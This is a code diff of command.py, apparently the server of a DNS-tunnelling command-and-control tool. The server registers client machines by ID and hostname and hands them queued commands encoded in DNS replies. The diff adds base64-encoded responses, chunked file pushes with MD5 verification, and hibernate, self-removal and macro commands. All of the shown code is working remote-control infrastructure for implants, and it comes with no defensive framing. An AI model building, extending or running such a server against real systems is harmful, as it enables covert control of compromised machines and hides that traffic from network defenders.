@@ -1,5 +1,10 @@
 # command.py
 import json
+import time
+import base64
+from os import path
+import hashlib
+
 import settings
 
 # parse command from dns request.  For consistency, each value will be counted from the right
@@ -13,7 +18,10 @@ def parsecommand(cmddata):
         "fil": optFile,
         "cnk": optChunk,
         "cmd": optCommand,
-        "dis": optDissolve
+        "dis": optDissolve,
+        "hib": optHibernate,
+        "hsh": optHash,
+        "mac": optMacro
     }
 
     return options[decodedcmd](cmddata)
@@ -39,7 +47,9 @@ def optInit(cmddata):
                 idTracker = record
 
         if not found:                                       # if this host doesn't have an ID, assign one and save record to manage.json
-            manage["clients"][str(idTracker)] = {"hostname": decodedHostname, "command": "", "response": ""}
+            manage["clients"][str(idTracker)] = settings.unknownEntry
+            manage["clients"][str(idTracker)]["hostname"] = decodedHostname
+            manage["clients"][str(idTracker)]["lastactive"] = time.time()
             manage["id"] += 1
 
         with open('./manage.json', 'w') as f:
@@ -48,7 +58,7 @@ def optInit(cmddata):
     print("ID: " + str(idTracker) + "\tHostname: " + decodedHostname)
     print("\n" + str(manage["currID"]) + " > ", end = '')
 
-    return str(idTracker)
+    return base64.b64encode(str(idTracker).encode())
 
 def optCommand(cmddata):
     clientID = cmddata[-2]                              # grab value 2, client ID
@@ -59,20 +69,25 @@ def optCommand(cmddata):
             manage = json.load(f)
         
         if clientID not in manage["clients"]:           # if client is running and for some reason is not stored in manage.json, add it
-            manage["clients"][clientID] = {"hostname": "unknown", "command": "", "response": ""}
+            manage["clients"][clientID] = settings.unknownEntry
             print("\n\n!New Connection!\n")
             print("ID: " + clientID + "\tHostname: " + manage["clients"][clientID]["hostname"])
+            print("\n" + str(manage["currID"]) + " > ", end = '')
 
         command = manage["clients"][clientID]["command"]
 
         if command != "":
             manage["clients"][clientID]["response"] = ""
+        
         manage["clients"][clientID]["command"] = ""
+        manage["clients"][clientID]["lastactive"] = time.time()
 
         with open('./manage.json', 'w') as f:
             json.dump(manage, f)
 
-    return command
+    if command:
+        return base64.b64encode(command.encode())
+    return base64.b64encode("wait".encode())
 
 def optChunk(cmddata):
     clientID = cmddata[-2]                              # grab value 2, client ID
@@ -88,7 +103,7 @@ def optChunk(cmddata):
         with open('./manage.json', 'w') as f:
             json.dump(manage, f)
 
-    return "ready"
+    return base64.b64encode("ready".encode())
 
 def optEnd(cmddata):
     clientID = cmddata[-2]                              # grab value 2, client ID
@@ -98,7 +113,7 @@ def optEnd(cmddata):
     print("\n\n" + manage["clients"][clientID]["response"])
     print("\n" + str(manage["currID"]) + " > ", end = '')
 
-    return "ok"
+    return base64.b64encode("ok".encode())
 
 def optDissolve(cmddata):
     clientID = cmddata[-2]                              # grab value 2, client ID
@@ -113,7 +128,52 @@ def optDissolve(cmddata):
         with open('./manage.json', 'w') as f:
             json.dump(manage, f)
         
-    return "done"
+    return base64.b64encode("done".encode())
+
+def optHibernate(cmddata):
+    clientID = cmddata[-2]                              # grab value 2, client ID
+    arg1 = bytes.fromhex(cmddata[-3]).decode('utf-8')   # decode value 3, argument
+
+    with open('./manage.json') as f:
+            manage = json.load(f)
+
+    if arg1 == "time":
+        return base64.b64encode(manage["clients"][clientID]["arg"].encode())
 
 def optFile(cmddata):
-    return None
+    clientID = cmddata[-2]                              # grab value 2, client ID
+    index = bytes.fromhex(cmddata[-3]).decode('utf-8')  # decode value 3, file index posistion
+
+    with open('./manage.json') as f:
+        manage = json.load(f)
+
+    if (index == "name"):
+        return base64.b64encode(manage["clients"][clientID]["file"]["name"].encode())
+    if (index == "size"):
+        return base64.b64encode(str(len(manage["clients"][clientID]["file"]["data"])).encode())
+    if (int(index) >= len(manage["clients"][clientID]["file"]["data"])):
+        return base64.b64encode("done".encode())
+    return manage["clients"][clientID]["file"]["data"][int(index):int(index) + 0xfc].encode()
+
+def optHash(cmddata):
+    clientID = cmddata[-2]                                  # grab value 2, client ID
+    filehash = cmddata[-3]                                  # grab value 3, hash of file
+
+    with open('./manage.json') as f:
+        manage = json.load(f)
+    
+    hash_object = hashlib.md5(base64.b64decode(manage["clients"][clientID]["file"]["data"]))
+
+    if filehash == hash_object.hexdigest():
+        return base64.b64encode("done".encode())
+    return base64.b64encode("bad".encode())
+
+def optMacro(cmddata):
+    index = cmddata[-2]                                  # grab value 2, index
+    with open('./manage.json') as f:
+        manage = json.load(f)
+    
+    if (index == "s"):
+        return str(len(manage["macro"])).encode()
+
+    return manage["macro"][int(index):int(index) + 0xfc].encode()
